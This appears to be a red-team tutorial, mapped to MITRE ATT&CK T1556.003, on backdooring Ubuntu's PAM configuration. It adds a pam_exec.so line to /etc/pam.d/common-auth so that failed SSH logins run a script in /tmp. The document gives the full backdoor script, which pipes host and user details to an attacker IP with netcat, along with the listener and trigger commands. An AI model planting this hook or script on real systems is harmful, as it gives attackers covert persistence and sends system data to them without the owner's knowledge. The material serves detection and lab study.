## [T1556.003-Modify Authentication Process: Pluggable Authentication Modules](https://attack.mitre.org/techniques/T1556/003/)  

### Background  
The pam_exec.so module in Linux Pluggable Authentication Modules (PAM) provides a flexible mechanism to execute custom scripts during various authentication stages. While commonly used for legitimate logging and running scripts for automation, this feature can be maliciously abused to trigger backdoor scripts in response to specific authentication events. In this scenario lets see how to trigger backdoor for SSH failure logins on Ubuntu 22.04 and maintain persistence. This technique can work in all other ubuntu environments as well. While Group-IB showcased this [technique](https://www.group-ib.com/blog/pluggable-authentication-module/) on Red Hat-based systems like Fedora and CentOS, they didn’t cover Debian-based environments. Here, I demonstrate how the same method works on Ubuntu or Debian-Based Systems. Unlike RPM-based systems where the /etc/pam.d/sshd file handles SSH authentication directly, Debian-based systems separate the authentication logic into the /etc/pam.d/common-auth file, which is included by the sshd PAM configuration.
### Test Environment: 
**Victim:** Ubuntu 22.04    
**Attacker:** Ubuntu 24.04 (You can choose any OS vendor for this)  
Install netcat on Attacker system.  
**Note:** This technique works on all debian systems.
### Implementation:  

#### Step1: Change the PAM config
At victim side, for getting persistence edit the file /etc/pam.d/common-auth file and add the following line below pam_unix.so line.  
``vim /etc/pam.d/common-auth``   
``auth optional pam_exec.so quiet setuid /tmp/s.sh``  
**Note1:** /tmp/s.sh file a backdoor script in this scenario.   
**Note2:** In PAM configuration, the **success=N** directive means: If the current module succeeds, skip the next N lines. So if the ssh authentication is successful the module has to skip the next  3 followed lines. Since the SSH authentication module currently uses success=2, and we are adding an additional line below it, we need to update this value to success=3 to ensure the correct number of lines are skipped on successful authentication.    
**Before:**   

![image](https://github.com/user-attachments/assets/da285bd7-1df4-40e2-9352-1e243c80b773)    

**After:**   

You can observe the modified success value to 3 in pam_unix.so line as shown.  

![PAM-Exec-SSHFailure](https://github.com/user-attachments/assets/d3cf8ab4-b491-46fc-a378-865b55e71808)  
Once you make any changes to PAM configuration you have to restart  
sudo systemctl restart ssh  


#### Step2: Drop Backdoor script 
At victim side. 
**Backdoor script:** 
```
#!/bin/bash 

REMOTE_IP="<attackerIP>" 
REMOTE_PORT="4444" 
echo -e "Hostname: $(hostname)\nUser: $(whoami)\nUptime: $(uptime)\nOSDetails:$(uname -a)" | nc $REMOTE_IP $REMOTE_PORT
```  
``chmod 770 /tmp/s.sh``  
``chmod +x /tmp/s.sh``  

#### Step3: Listen for incoming connections and try ssh auth failures - Attacker Side:  
listen for incoming connections.  
```nc -lvp 4444```  
Try repeatedly logging into the victim machine’s SSH with invalid credentials to generate authentication failures that will trigger the backdoor as shown below screenshot.  
```ssh user@<victimIp>```    
Finally the output looks like below.  

![450890823-89aadc9b-46ca-4925-8996-c6305434d260](https://github.com/user-attachments/assets/4a75f2ed-9450-4e07-87aa-d0ecb26511f4)  
